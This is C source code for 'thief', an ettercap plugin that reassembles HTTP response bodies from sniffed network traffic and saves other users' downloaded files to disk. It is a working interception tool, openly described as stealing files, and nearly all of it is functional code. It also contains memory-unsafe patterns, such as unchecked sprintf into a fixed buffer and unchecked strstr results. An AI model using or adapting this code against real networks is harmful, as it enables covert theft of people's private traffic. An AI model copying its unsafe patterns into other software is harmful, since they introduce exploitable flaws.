/*
    thief -- ettercap plugin -- steal files from HTTP stream

    Copyright (C) 2001  NaGoR

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

    $Id: H30_thief.c,v 1.3 2002/02/01 20:55:11 alor Exp $
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "../../src/include/ec_main.h"
#include "../../src/include/ec_plugins.h"
#include "../../src/include/ec_error.h"
#include "../../src/include/ec_inet_structures.h"
#include "../../src/include/ec_debug.h"

//#define DEBUG

struct state_machine   // state machine double linked list for some protocol dissector
{
   long source_ip;
   long dest_ip;
   u_short source_port;
   u_short dest_port;
   int f;
   int length;
   LIST_ENTRY (state_machine) next;
};


LIST_HEAD(, state_machine) T_SM_head;


typedef struct
{
   char mime[30];
   char extension[6];
   struct mime_database *next;
} mime_database;

mime_database *mime_list = NULL;

int file_number;


// protos...

int Plugin_Init(void *);
int Plugin_Fini(void *);
int Parse_Packet(void *data);

int Thief_StateMachine_GetStatus(CONNECTION *data_to_ettercap, int *f);
int Thief_StateMachine_SetStatus(CONNECTION *data_to_ettercap, int length, int f);
char * Thief_mime(char *mime);

// plugin operation

struct plugin_ops ops = {
   ettercap_version: VERSION,
   plug_info:        "steal files from HTTP stream",
   plug_version:     10,
   plug_type:        PT_HOOK,
   hook_point:       PCK_DISSECTOR,
   hook_function:    &Parse_Packet,
};

//==================================

int Plugin_Init(void *params)
{
   return Plugin_Register(params, &ops);
}

int Plugin_Fini(void *params)
{
   return 0;
}

// =================================




int Parse_Packet(void *data)
{

   DISSECTION *data_from_ettercap;
   u_char *collector, *payload;
   TCP_header *tcp;
   char *p, *c;
   int length = 0;
   int ftw;

   data_from_ettercap = (DISSECTION *)data;

   if (data_from_ettercap->connection->proto == 'U') return 0;

   if (data_from_ettercap->connection->datalen == 0) return 0;

   if (data_from_ettercap->connection->source_port != 80) return 0;

   /* here only HTTP packet */

   collector = (u_char *)calloc(data_from_ettercap->connection->datalen, 1);

   tcp = (TCP_header *) data_from_ettercap->layer4;
   payload = (char *)((int)tcp + tcp->doff * 4);

   memcpy(collector, payload, data_from_ettercap->connection->datalen);


   if ( (length = Thief_StateMachine_GetStatus(data_from_ettercap->connection, &ftw)) )
   {
      #ifdef DEBUG
         Debug_msg("Thief content reget -- [%d] \n", length);
      #endif

      write(ftw, collector, data_from_ettercap->connection->datalen);

      Thief_StateMachine_SetStatus(data_from_ettercap->connection, length - data_from_ettercap->connection->datalen, ftw );

      #ifdef DEBUG
         Debug_msg("Thief content end -- [%d] \n", length - data_from_ettercap->connection->datalen);
      #endif

   }
   else
   {
      if ( (c = strstr(collector, "Content-Length: ")) )
      {
         char *q, *t;
         q = strdup(c);
         t = strstr(q, "\r");
         *t = 0;
         c = q + strlen("Content-Length: ");

         length = atoi(c);
         free(q);
      }

      if ( (p = strstr(collector, "Content-Type: ")) )
      {
         char *q, *t, *to_write;
         char filename[50];
         char *ext;
         int write_len;

         q = strdup(p);
         t = strstr(q, "\r");
         *t = 0;
         p = q + strlen("Content-Type: ");

         ext = Thief_mime(p);

         if (ext == NULL)
         {
            free(collector);
            return 0;
         }

         #ifdef DEBUG
            Debug_msg("Thief content -- [%s] -- [%s] -- [%d]\n", p, ext, length);
         #endif

         sprintf(filename, "./%s-%d.%s", data_from_ettercap->connection->source_ip, file_number++, ext);

         ftw = open( filename, O_CREAT|O_TRUNC|O_WRONLY, 0600 );

         Thief_StateMachine_SetStatus(data_from_ettercap->connection, length, ftw );

         to_write = strstr(collector, "\r\n\r\n");
         to_write += 4;

         write_len = data_from_ettercap->connection->datalen - ((int)to_write - (int)collector);

         write(ftw, to_write, write_len);

         Thief_StateMachine_SetStatus(data_from_ettercap->connection, length - write_len, ftw );

         #ifdef DEBUG
            Debug_msg("Thief content end -- [%d] \n", length - write_len);
         #endif

      }

   }
   free(collector);

   return 0;
}


int Thief_StateMachine_GetStatus(CONNECTION *data_to_ettercap, int *f)
{
   struct state_machine *ptr;

   LIST_FOREACH(ptr, &T_SM_head, next)
   {

      if ( ((ptr->source_ip == inet_addr(data_to_ettercap->source_ip) &&     // straight
             ptr->dest_ip == inet_addr(data_to_ettercap->dest_ip) &&
             ptr->source_port == data_to_ettercap->source_port &&
             ptr->dest_port == data_to_ettercap->dest_port)
             ||
             (ptr->source_ip == inet_addr(data_to_ettercap->dest_ip) &&       // reverse
             ptr->dest_ip == inet_addr(data_to_ettercap->source_ip) &&
             ptr->source_port == data_to_ettercap->dest_port &&
             ptr->dest_port == data_to_ettercap->source_port))
         )
      {
         *f = ptr->f;
         return ptr->length;
      }
   }
   return 0;
}


int Thief_StateMachine_SetStatus(CONNECTION *data_to_ettercap, int length, int f)
{
   struct state_machine *ptr, *current;

   LIST_FOREACH(ptr, &T_SM_head, next)
   {
      if ( ((ptr->source_ip == inet_addr(data_to_ettercap->source_ip) &&     // straight
             ptr->dest_ip == inet_addr(data_to_ettercap->dest_ip) &&
             ptr->source_port == data_to_ettercap->source_port &&
             ptr->dest_port == data_to_ettercap->dest_port)
             ||
             (ptr->source_ip == inet_addr(data_to_ettercap->dest_ip) &&       // reverse
             ptr->dest_ip == inet_addr(data_to_ettercap->source_ip) &&
             ptr->source_port == data_to_ettercap->dest_port &&
             ptr->dest_port == data_to_ettercap->source_port))
          )
      {
         #ifdef DEBUG
            Debug_msg("\tThief_StateMachine_SetStatus -  %s:%d - %s:%d -- [%d]",
                        data_to_ettercap->source_ip,
                        data_to_ettercap->source_port,
                        data_to_ettercap->dest_ip,
                        data_to_ettercap->dest_port,
                        length);
         #endif
         if (length)
         {
            ptr->length = length;
            return 0;
         }
         else
         {
            close(ptr->f);
            LIST_REMOVE(ptr, next);
            free(ptr);
         }
         return 0;
      }
   }

   if (length)
   {
      #ifdef DEBUG
         Debug_msg("\tThief_StateMachine_SetStatus - new item - state %s:%d - %s:%d -- [%d]",
                      data_to_ettercap->source_ip,
                      data_to_ettercap->source_port,
                      data_to_ettercap->dest_ip,
                      data_to_ettercap->dest_port,
                      length);
      #endif

      current = (struct state_machine *)calloc(1, sizeof(struct state_machine));
      if (current == NULL)
         ERROR_MSG("calloc()");

      current->source_ip = inet_addr(data_to_ettercap->source_ip);
      current->dest_ip = inet_addr(data_to_ettercap->dest_ip);
      current->source_port = data_to_ettercap->source_port;
      current->dest_port = data_to_ettercap->dest_port;
      current->f = f;
      current->length = length;

      LIST_INSERT_HEAD(&T_SM_head, current, next);
   }
   return 0;
}




char * Thief_mime(char *mime)
{
   FILE *fto;
   char line[1024];
   char *ptr;
   mime_database *mime_index;

   if (!strcmp(mime, "")) return NULL;

   if (mime_list == NULL)  // only the first time
   {

      if ( (mime_index = (mime_database *)calloc(1,sizeof(mime_database))) == NULL)
         ERROR_MSG("calloc()");

      mime_list = mime_index;

      fto = fopen(DATA_PATH "/etter.mime", "r");
      if (!fto)
         fto = fopen("./etter.mime","r");
         if (!fto)
            Error_msg("Can't open \"etter.mime\" file !!");

      while (fgets (line, 1024, fto))
      {
         if ( (ptr = strchr(line, '#')) )
            *ptr = 0;

         if (!strlen(line))   // skip 0 length line
            continue;

         line[strlen(line)-1] = 0;

         if ( (mime_index->next = ( struct mime_database *) calloc (1, sizeof(mime_database))) == NULL)
            ERROR_MSG("calloc()");

         sscanf(line, "%s", mime_index->mime);
         strlcpy(mime_index->extension, line+33, sizeof(mime_index->extension));

         mime_index = (mime_database *) mime_index->next;
      }

      fclose (fto);
      mime_index->next = NULL;
   }

   mime_index = mime_list;
   for( ; mime_index; mime_index = (mime_database *)mime_index->next)
   {
      if (!strcmp(mime_index->mime, mime))
      {
         return mime_index->extension;
      }
   }
   return NULL;
}


/* EOF */
